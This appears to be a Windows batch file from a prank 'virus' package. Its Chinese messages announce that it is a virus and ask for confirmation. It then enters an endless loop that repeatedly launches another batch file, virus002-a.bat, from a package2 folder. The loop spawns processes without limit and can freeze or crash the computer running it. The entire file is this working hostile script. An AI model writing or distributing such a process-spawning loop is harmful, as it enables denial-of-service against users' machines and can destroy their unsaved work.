@echo off
echo 这是一个病毒，若要运行，请点击任意键，若要退出，请关闭该窗口。
pause
msg * /v /w 确定要运行？
:begin
cd package2
start virus002-a.bat
goto begin